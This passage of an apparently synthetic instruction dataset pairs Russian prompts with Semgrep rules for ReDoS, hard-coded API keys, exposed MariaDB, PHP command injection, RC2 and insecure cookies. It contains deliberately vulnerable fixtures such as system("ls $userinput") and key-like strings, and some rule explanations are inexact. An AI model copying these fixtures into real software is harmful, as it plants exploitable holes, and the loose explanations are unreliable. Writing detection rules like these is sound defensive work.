result = Regex.Match(search, pattern, new RegexOptions { });\n        }\n\n        // ok: regular-expression-dos\n        public void Validate5(string search)\n        {\n            var pattern = @\"^A(B|C+)+D\";\n            var result = Regex.Match(search, pattern, new RegexOptions { }, TimeSpan.FromSeconds(2000));\n        }\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• public void ValidateRegex(string search) {\n\tRegex rgx = new Regex(\"^A(B|C+)+D\");\n\trgx.Match(search);\n}\n• public void ValidateRegex2(string search) {\n\tRegex rgx = new Regex(\"^A(B|C+)+D\", new RegexOptions { });\n\trgx.Match(search);\n}\n\nБезопасные паттерны:  \n• public void ValidateRegex3(string search) {\n\tRegex rgx = new Regex(\"^A(B|C+)+D\", new RegexOptions { }, TimeSpan.FromSeconds(2000));\n\trgx.Match(search);\n}\n• public void Validate5(string search) {\n\tvar pattern = @\"^A(B|C+)+D\";\n\tvar result = Regex.Match(search, pattern, new RegexOptions { }, TimeSpan.FromSeconds(2000));\n}\n\nЛегенда аннотаций:\n- // ruleid:regular-expression-dos: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:regular-expression-dos: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: regular-expression-dos\n  severity: WARNING\n  languages:\n  - C#\n  metadata:\n    cwe:\n    - 'CWE-1333: Inefficient Regular Expression Complexity'\n    owasp: 'A01:2017 - Injection'\n    references:\n    - https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\n    - https://docs.microsoft.com/en-us/dotnet/standard/base-types/regular-expressions#regular-expression-examples\n    category: security\n    technology:\n    - .net\n    confidence: MEDIUM\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n  message: >-\n    When using `System.Text.RegularExpressions` to process untrusted input, pass a timeout. \n    A malicious user can provide input to `RegularExpressions` that abuses the backtracking behaviour of this regular expression engine.\n    This will lead to excessive CPU usage, causing a Denial-of-Service attack\n  patterns:\n  - pattern-inside: |\n      using System.Text.RegularExpressions;\n      ...\n  - pattern-either:\n    - pattern: |\n        public $T $F($X)\n        {\n          Regex $Y = new Regex($P);\n          ...\n          $Y.Match($X);\n        }\n    - pattern: |\n        public $T $F($X)\n        {\n          Regex $Y = new Regex($P, $O);\n          ...\n          $Y.Match($X);\n        }\n    - pattern: |\n        public $T $F($X)\n        {\n          ... Regex.Match($X, $P);\n        }\n    - pattern: |\n        public $T $F($X)\n        {\n          ... Regex.Match($X, $P, $O);\n        }\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов метода Match класса Regex из пространства имен System.Text.RegularExpressions без указания тайм-аута. Паттерн ищет объявления методов с именем, начинающимся на 'public', принимающих строку в качестве аргумента, за которым следует создание объекта Regex и вызов метода Match без явного указания времени ожидания. Это может привести к злоупотреблению поведением обратного отслеживания движка регулярных выражений, вызывая чрезмерное потребление процессора и отказ в обслуживании.\n\n# Ключевые элементы:\n- ID: regular-expression-dos\n- Язык: C# \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "regular-expression-dos",
      "language": "C#",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: twilio-api-key\nОписание уязвимости: A gitleaks twilio-api-key was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: twilio-api-key.go\n// ruleid: twilio-api-key\ntwilioAPIKey := \"SK157566aaf09e11bb816f6cd3c9942843\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: twilio-api-key.go\n// ruleid: twilio-api-key\ntwilioAPIKey := \"SK157566aaf09e11bb816f6cd3c9942843\"\n• // File: example.go\n// ruleid: twilio-api-key\ntwilioToken := \"SKabc123def456ghijklmnopqrstuvwx\"\n• // File: test.go\n// ruleid: twilio-api-key\nconst twilioSecret = \"SK0123456789abcdef0123456789abcdef\"\n\nБезопасные паттерны:  \n• // File: safe-code.go\nvar twilioAPIKey string = os.Getenv(\"TWILIO_API_KEY\")\n• // File: secure-code.go\nfunc getTwilioToken() string { return secureVault.Get(\"twilio_token\") }\n• // File: config.go\nconfig.TwilioAPIKey = vaultClient.Fetch(\"twilio_api_key\")\n\nЛегенда аннотаций:\n- // ruleid:twilio-api-key: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:twilio-api-key: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: twilio-api-key\n  message: A gitleaks twilio-api-key was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: SK[0-9a-fA-F]{32}\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированных токенов Twilio API, начинающихся с префикса 'SK' и следующих за ним 32 символа из букв и цифр. Тип анализа — поиск (search). Правило применимо только к языкам, поддерживающим регулярные выражения.\n\n# Ключевые элементы:\n- ID: twilio-api-key\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "twilio-api-key",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: azure-mariadb-public-access-disabled\nОписание уязвимости: Ensure public network access enabled is set to False for MariaDB servers\nCWE: CWE-1220: Insufficient Granularity of Access Control\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-1220: Insufficient Granularity of Access Control\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: azure-mariadb-public-access-disabled.tf\n# fail\n# ruleid: azure-mariadb-public-access-disabled\nresource \"azurerm_mariadb_server\" \"example\" {\n    name                = var.server_name\n    location            = var.resource_group.location\n    resource_group_name = var.resource_group.name\n    administrator_login          = var.admin_login\n    administrator_login_password = random_string.password.result\n    sku_name   = \"B_Gen5_2\"\n    storage_mb = 5120\n    version    = \"10.2\"\n    auto_grow_enabled             = true\n    backup_retention_days         = 7\n    geo_redundant_backup_enabled  = false\n    public_network_access_enabled = true\n    ssl_enforcement_enabled = false\n}\n\n# pass\nresource \"azurerm_mariadb_server\" \"example\" {\n    name                = var.server_name\n    location            = var.resource_group.location\n    resource_group_name = var.resource_group.name\n    administrator_login          = var.admin_login\n    administrator_login_password = random_string.password.result\n    sku_name   = \"B_Gen5_2\"\n    storage_mb = 5120\n    version    = \"10.2\"\n    auto_grow_enabled             = true\n    backup_retention_days         = 7\n    geo_redundant_backup_enabled  = false\n    public_network_access_enabled = false\n    ssl_enforcement_enabled = true\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_mariadb_server\" \"example\" { ... public_network_access_enabled = true ... }\n• resource \"azurerm_mariadb_server\" \"example\" { ... public_network_access_enabled = null ... }\n\nБезопасные паттерны:  \n• resource \"azurerm_mariadb_server\" \"example\" { ... public_network_access_enabled = false ... }\n• resource \"azurerm_mariadb_server\" \"example\" { ... # comment public_network_access_enabled = false ... }\n\nЛегенда аннотаций:\n- // ruleid:azure-mariadb-public-access-disabled: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:azure-mariadb-public-access-disabled: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: azure-mariadb-public-access-disabled\n  message: >-\n    Ensure public network access enabled is set to False for MariaDB servers\n  patterns:\n  - pattern: resource\n  - pattern-inside: |\n      resource \"azurerm_mariadb_server\" \"...\" {\n      ...\n      }\n  - pattern-not-inside: |\n      resource \"azurerm_mariadb_server\" \"...\" {\n      ...\n      public_network_access_enabled = false\n      ...\n      }\n  metadata:\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    cwe:\n    - 'CWE-1220: Insufficient Granularity of Access Control'\n    category: security\n    technology:\n    - terraform\n    - azure\n    references:\n    - https://owasp.org/Top10/A01_2021-Broken_Access_Control\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска конфигураций Azure MariaDB серверов, где разрешен публичный сетевой доступ (public_network_access_enabled). Правило выполняет поиск ресурсов типа azurerm_mariadb_server и проверяет наличие блока public_network_access_enabled внутри ресурса. Если этот параметр не установлен в значение false, то правило считает такую конфигурацию небезопасной. Безопасная конфигурация должна явно указывать public_network_access_enabled = false.\n\n# Ключевые элементы:\n- ID: azure-mariadb-public-access-disabled\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "azure-mariadb-public-access-disabled",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: tainted-exec\nОписание уязвимости: User input is passed to a function that executes a shell command. This can lead to remote code execution.\nCWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\nТип анализа: taint\nЯзык: php\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле\nСпособы санитации: определены в правиле",
    "input": "Требования:\n- Язык: php\n- Тип анализа: taint\n- CWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: tainted-exec.php\n<?php\n\n$userinput = $_GET['userinput'];\n\n// ruleid: tainted-exec\nsystem(\"ls $userinput\");\n\n$escaped = escapeshellarg($userinput);\n// ok: tainted-exec\nsystem(\"ls $escaped\");\n\n$descriptors = [[\"pipe\", \"r\"], [\"pipe\", \"w\"], [\"pipe\", \"w\"]];\n$pipes = [];\n\n// ruleid: tainted-exec\n$p = proc_open(\"ls $userinput\", $descriptors, $pipes);\necho stream_get_contents($pipes[1]);\n\n// ok: tainted-exec\n$p = proc_open([\"ls\", $userinput], $descriptors, $pipes);\necho stream_get_contents($pipes[1]);  # Ограничиваем длину\n\nОпасные паттерны:\n• system(\"ls $userinput\");\n• proc_open(\"ls $userinput\", ...);\n\nБезопасные паттерны:  \n• system(\"ls \" . escapeshellarg($userinput));\n• proc_open([\"ls\", $userinput], ..., ...);\n\nЛегенда аннотаций:\n- // ruleid:tainted-exec: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:tainted-exec: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: tainted-exec\n  languages:\n  - php\n  severity: WARNING\n  message: >-\n    User input is passed to a function that executes a shell command. This can lead to remote code execution.\n  metadata:\n    cwe:\n    - \"CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\"\n    category: security\n    technology:\n    - php\n    owasp:\n    - A03:2021 - Injection\n    references:\n    - https://owasp.org/Top10/A03_2021-Injection\n    subcategory:\n    - vuln\n    impact: HIGH\n    likelihood: MEDIUM\n    confidence: MEDIUM\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern-either:\n      - pattern: $_GET\n      - pattern: $_POST\n      - pattern: $_COOKIE\n      - pattern: $_REQUEST\n      - pattern: file_get_contents('php://input')\n  pattern-sanitizers:\n  - patterns:\n    - pattern-either:\n      - pattern: escapeshellcmd(...)\n      - pattern: escapeshellarg(...)\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - pattern: exec(...)\n      - pattern: system(...)\n      - pattern: passthru(...)\n      - patterns:\n        - pattern: proc_open(...)\n        - pattern-not: proc_open([...], ...)\n      - pattern: popen(...)\n      - pattern: expect_popen(...)\n      - pattern: shell_exec(...)\n      - pattern: |\n          `...`\n\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования user input в функциях, выполняющих shell-команды. Источники (sources) определяют переменные, которые могут быть загрязнены (tainted), например, данные из GET, POST, COOKIE запросов или содержимое 'php://input'. Синки (sinks) представляют функции, потенциально опасные при использовании загрязненных данных, такие как exec(), system(), passthru() и другие. Правило также учитывает случаи, когда ввод не был должным образом очищен (санитизирован) с помощью функций escapeshellcmd() или escapeshellarg().\n\n# Ключевые элементы:\n- ID: tainted-exec\n- Язык: php \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "tainted-exec",
      "language": "php",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: use-earliest-or-latest\nОписание уязвимости: Looks like you are only accessing first element of an ordered QuerySet. Use `latest()` or `earliest()` instead. See https://docs.djangoproject.com/en/3.0/ref/models/querysets/#django.db.models.query.QuerySet.latest\nCWE: \nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: \n- Серьезность: ERROR\n\nКонтекст кода:\n// File: upsell_earliest_latest.py\n# ruleid:use-earliest-or-latest\nEntry.objects.order_by()[0]\n# OK\nEntry.objects.order_by()[1]\n\n# ruleid:use-earliest-or-latest\nEntry.objects.all().order_by('foo')[0]\n# OK\nEntry.objects.all().order_by('foo')[1]\n\n# ruleid:use-earliest-or-latest\nEntry.objects.all().filter().order_by('foo')[0]\n# OK\nEntry.objects.all().filter().order_by('foo')[1]\n\ndef order_by(foo: str): pass\n# OK\norder_by(\"testing\")  # Ограничиваем длину\n\nОпасные паттерны:\n• Entry.objects.order_by()[0]\n• Entry.objects.all().order_by('foo')[0]\n• Entry.objects.all().filter().order_by('foo')[0]\n\nБезопасные паттерны:  \n• Entry.objects.order_by()[1]\n• order_by(\"testing\")\n\nЛегенда аннотаций:\n- // ruleid:use-earliest-or-latest: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:use-earliest-or-latest: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: use-earliest-or-latest\n    message:\n      Looks like you are only accessing first element of an ordered QuerySet. Use `latest()` or `earliest()` instead.\n      See https://docs.djangoproject.com/en/3.0/ref/models/querysets/#django.db.models.query.QuerySet.latest\n    languages: [python]\n    severity: ERROR\n    pattern-either:\n      - pattern: $X.objects.order_by(...)[0]\n      - pattern: $X.objects.$FUNC(...).order_by(...)[0]\n      - pattern: $X.objects.$FUNC(...).$FILTER(...).order_by(...)[0]\n    metadata:\n      category: performance\n      technology:\n        - django\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска случаев, когда из упорядоченного набора объектов Django QuerySet извлекается только первый элемент с использованием индекса [0]. Правило применяет три шаблона: прямой доступ через .order_by()[0], вызов метода объекта .order_by() внутри другого метода ($FUNC) и вызов фильтра перед порядком ($FILTER). Шаблоны используют метапеременную $X для обозначения любого имени модели или переменной, а также метапеременные $FUNC и $FILTER для обозначения методов и фильтров соответственно.\n\n# Ключевые элементы:\n- ID: use-earliest-or-latest\n- Язык: python \n- Тип: \n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "use-earliest-or-latest",
      "language": "python",
      "severity": "ERROR",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: insecure-cipher-algorithm-rc2\nОписание уязвимости: Detected RC2 cipher algorithm which is considered insecure. This algorithm is not cryptographically secure and can be reversed easily. Use secure stream ciphers such as ChaCha20, XChaCha20 and Salsa20, or a block cipher such as AES with a block size of 128 bits. When using a block cipher, use a modern mode of operation that also provides authentication, such as GCM.\nCWE: CWE-327: Use of a Broken or Risky Cryptographic Algorithm\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: insecure-cipher-algorithm-rc2.py\n# cf. https://github.com/PyCQA/bandit/blob/b78c938c0bd03d201932570f5e054261e10c5750/examples/ciphers.py\n\nfrom Crypto.Cipher import AES\nfrom Crypto.Cipher import ARC2 as pycrypto_arc2\nfrom Crypto.Cipher import ARC4 as pycrypto_arc4\nfrom Crypto.Cipher import Blowfish as pycrypto_blowfish\nfrom Crypto.Cipher import DES as pycrypto_des\nfrom Crypto.Cipher import XOR as pycrypto_xor\nfrom Cryptodome.Cipher import ARC2 as pycryptodomex_arc2\nfrom Cryptodome.Cipher import ARC4 as pycryptodomex_arc4\nfrom Cryptodome.Cipher import Blowfish as pycryptodomex_blowfish\nfrom Cryptodome.Cipher import DES as pycryptodomex_des\nfrom Cryptodome.Cipher import XOR as pycryptodomex_xor\nfrom Crypto.Hash import SHA\nfrom Crypto import Random\nfrom Crypto.Util import Counter\n\nkey = b'Sixteen byte key'\niv = Random.new().read(pycrypto_arc2.block_size)\n# ruleid:insecure-cipher-algorithm-rc2\ncipher = pycrypto_arc2.new(key, pycrypto_arc2.MODE_CFB, iv)\n# deepruleid:insecure-cipher-algorithm-rc2\nmsg = iv + cipher.encrypt(b'Attack at dawn')\n# ruleid:insecure-cipher-algorithm-rc2\ncipher = pycryptodomex_arc2.new(key, pycryptodomex_arc2.MODE_CFB, iv)\n# deepruleid:insecure-cipher-algorithm-rc2\nmsg = iv + cipher.encrypt(b'Attack at dawn')\n\nkey = b'Sixteen byte key'\n# ok:insecure-cipher-algorithm-rc2\ncipher = AES.new(key, AES.MODE_EAX, nonce=nonce)\nplaintext = cipher.decrypt(ciphertext)\ntry:\n    cipher.verify(tag)\n    print(\"The message is authentic:\", plaintext)\nexcept ValueError:\n    print(\"Key incorrect or message corrupted\")  # Ограничиваем длину\n\nОпасные паттерны:\n• cipher = pycrypto_arc2.new(key, pycrypto_arc2.MODE_CFB, iv)\n• cipher = pycryptodomex_arc2.new(key, pycryptodomex_arc2.MODE_CFB, iv)\n\nБезопасные паттерны:  \n• cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)\n• // ok:insecure-cipher-algorithm-rc2\ncipher = AES.new(key, AES.MODE_EAX, nonce=nonce)\n\nЛегенда аннотаций:\n- // ruleid:insecure-cipher-algorithm-rc2: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:insecure-cipher-algorithm-rc2: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: insecure-cipher-algorithm-rc2\n  message: >-\n    Detected RC2 cipher algorithm which is considered insecure. This algorithm\n    is not cryptographically secure and can be reversed easily.\n    Use secure stream ciphers such as ChaCha20, XChaCha20 and Salsa20, or a block cipher such as AES with a block size of 128 bits.\n    When using a block cipher, use a modern mode of operation that also provides authentication, such as GCM.\n  metadata:\n    source-rule-url: https://github.com/PyCQA/bandit/blob/d5f8fa0d89d7b11442fc6ec80ca42953974354c8/bandit/blacklists/calls.py#L84\n    cwe:\n    - 'CWE-327: Use of a Broken or Risky Cryptographic Algorithm'\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    bandit-code: B304\n    references:\n    - https://cwe.mitre.org/data/definitions/326.html\n    - https://www.pycryptodome.org/src/cipher/cipher\n    category: security\n    technology:\n    - pycryptodome\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: HIGH\n    functional-categories:\n    - crypto::search::symmetric-algorithm::pycryptodome\n    - crypto::search::symmetric-algorithm::pycryptodomex\n  options:\n    symbolic_propagation: true\n  severity: WARNING\n  languages:\n  - python\n  pattern-either:\n  - pattern: Cryptodome.Cipher.ARC2.new(...)\n  - pattern: Crypto.Cipher.ARC2.new(...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования криптографического алгоритма RC2, который считается небезопасным. Алгоритм RC2 не является криптографически безопасным и может быть легко расшифрован. Правило использует оператор pattern-either для проверки наличия вызовов функций new() из модулей Cryptodome.Cipher.ARC2 и Crypto.Cipher.ARC2, которые соответствуют использованию шифра RC2.\n\n# Ключевые элементы:\n- ID: insecure-cipher-algorithm-rc2\n- Язык: python \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "insecure-cipher-algorithm-rc2",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: twitter-api-key\nОписание уязвимости: A gitleaks twitter-api-key was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: twitter-api-key.go\n// ruleid: twitter-api-key\ntwitter_api_token = \"u85rbvve240mfqz9y8xnkufuw\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: twitter-api-key.go\n// ruleid: twitter-api-key\ntwitter_api_token = \"u85rbvve240mfqz9y8xnkufuw\"\n\n• // File: another-twitter-go-key.go\nvar twitKey string = \"abc123def456ghijklmnopqrstuxyz\"\n• // File: yet-another-twitter-key.go\nconst TWITTER_API_KEY = \"123456789abcdef0123456789abcdfe\"\n\nБезопасные паттерны:  \n• // File: safe-twitter-key.go\nfunc getTwitterApiToken() string {\n   return os.Getenv(\"TWITTER_API_TOKEN\")\n}\n• // File: secure-twitter-key.go\nimport \"os\"\ntwitterApiToken := os.Getenv(\"TWITTER_API_KEY\")\n• // File: encrypted-twitter-key.go\nencryptedKey := encrypt(\"my-secret-twitter-key\")\n\nЛегенда аннотаций:\n- // ruleid:twitter-api-key: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:twitter-api-key: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: twitter-api-key\n  message: A gitleaks twitter-api-key was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)(?:twitter)(?:[0-9a-z\\-_\\t .]{0,20})(?:[\\s|']|[\\s|\"]){0,3}(?:=|>|:{1,3}=|\\|\\|:|<=|=>|:|\\?=)(?:'|\\\"|\\s|=|\\x60){0,5}([a-z0-9]{25})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированных токенов Twitter API в исходном коде. Регулярное выражение ищет строку, содержащую слово 'twitter', за которым следует произвольная последовательность букв, цифр и специальных символов длиной до 20 символов, после чего идет оператор присваивания или сравнения ('=', ':', etc.) и далее строка из 25 шестнадцатеричных символов, которая является типичным форматом токена Twitter API.\n\n# Ключевые элементы:\n- ID: twitter-api-key\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "twitter-api-key",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: use-count-method\nОписание уязвимости: Looks like you need to determine the number of records. Django provides the count() method which is more efficient than .len(). See https://docs.djangoproject.com/en/3.0/ref/models/querysets/\nCWE: \nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: \n- Серьезность: ERROR\n\nКонтекст кода:\n// File: upsell-count.py\n# ruleid:use-count-method\nprint(Entry.objects.all().len())\n# ruleid:use-count-method\nprint(Entry.objects.get().filter().len())\n# ruleid:use-count-method\nprint(Entry.objects.filter().filter().len())  # Ограничиваем длину\n\nОпасные паттерны:\n• print(Entry.objects.all().len())\n• print(Entry.objects.get().filter().len())\n• print(Entry.objects.filter().filter().len())\n\nБезопасные паттерны:  \n• print(Entry.objects.all().count())\n• print(len(Entry.objects.all()))\n• print(Entry.objects.filter(name='test').count())\n\nЛегенда аннотаций:\n- // ruleid:use-count-method: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:use-count-method: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: use-count-method\n    message:\n      Looks like you need to determine the number of records. Django provides the count() method which is more efficient\n      than .len(). See https://docs.djangoproject.com/en/3.0/ref/models/querysets/\n    languages: [python]\n    severity: ERROR\n    pattern-either:\n      - pattern: $X.objects.$FUNC(...).len()\n      - pattern: $X.objects.$FUNC(...).$FILTER().len()\n      - pattern: $X.objects.$FUNC(...).$FILTER().$UPDATE(...).len()\n    metadata:\n      category: performance\n      technology:\n        - django\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования метода len() вместо более эффективного count() в Django QuerySets. Анализ выполняется путем поиска вызовов методов, заканчивающихся на '.len()', где объект является экземпляром класса, производного от 'QuerySet'. Правило использует шаблон 'pattern-either' для охвата различных комбинаций методов и фильтров, применяемых к объектам QuerySet.\n\n# Ключевые элементы:\n- ID: use-count-method\n- Язык: python \n- Тип: \n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "use-count-method",
      "language": "python",
      "severity": "ERROR",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: cookie-issecure-false\nОписание уязвимости: Default session middleware settings: `setSecure` not set to true. This ensures that the cookie is sent only over HTTPS to prevent cross-site scripting attacks.\nCWE: CWE-319: Cleartext Transmission of Sensitive Information\nТип анализа: search\nЯзык: java",
    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: CWE-319: Cleartext Transmission of Sensitive Information\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: cookie-issecure-false.java\npublic class Bad {\n          public void bad1() {\n              // ruleid: cookie-issecure-false\n              Cookie cookie = new Cookie(\"name\", \"value\");\n          }\n   }\n\n public class Ok {\n          public void ok1() {\n             // ok: cookie-issecure-false\n             Cookie cookie = new Cookie(\"name\", \"value\");\n             cookie.setSecure(true);\n          }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: cookie-issecure-false.java\npublic class Bad {\n          public void bad1() {\n              // ruleid: cookie-issecure-false\n              Cookie cookie = new Cookie(\"name\", \"value\");\n        \n• // File: another-bad-code.java\npublic class AnotherBadClass {\n  public void anotherBadMethod() {\n    // ruleid: cookie-issecure-false\n    Cookie cookie = new Cookie(\"sessionId\", \"1234567890\");\n  }\n}\n\nБезопасные паттерны:  \n• // File: good-code.java\npublic class GoodClass {\n  public void goodMethod() {\n     // ok: cookie-issecure-false\n     Cookie cookie = new Cookie(\"username\", \"admin\");\n     cookie.setSecure(true);\n  }\n}\n• // File: secure-code.java\npublic class SecureClass {\n  public void secureMethod() {\n    Cookie cookie = new Cookie(\"token\", \"abc123\");\n    cookie.setSecure(true);\n  }\n}\n\nЛегенда аннотаций:\n- // ruleid:cookie-issecure-false: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:cookie-issecure-false: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: cookie-issecure-false\n    patterns:\n      - pattern: $COOKIE = new Cookie($...ARGS);\n      - pattern-not-inside: |\n          $COOKIE = new Cookie(...);\n          ...\n          $COOKIE.setSecure(...);\n    message: \"Default session middleware settings: `setSecure` not set to true. This\n      ensures that the cookie is sent only over HTTPS to prevent cross-site\n      scripting attacks.\"\n    fix: |\n        $COOKIE = new Cookie($...ARGS);\n        $COOKIE.setSecure(true);\n    metadata:\n      vulnerability: Insecure Transport\n      owasp:\n        - A03:2017 - Sensitive Data Exposure\n        - A02:2021 - Cryptographic Failures\n      cwe:\n        - \"CWE-319: Cleartext Transmission of Sensitive Information\"\n      references:\n        - https://docs.oracle.com/javaee/6/api/javax/servlet/http/Cookie.html#setSecure(boolean)\n        - https://owasp.org/www-community/controls/SecureCookieAttribute\n      category: security\n      technology: \n       - java\n       - cookie\n      subcategory:\n        - audit\n      likelihood: LOW\n      impact: LOW\n      confidence: LOW\n    languages:\n      - java\n    severity: WARNING\n\n# Логика правила:\nЭто 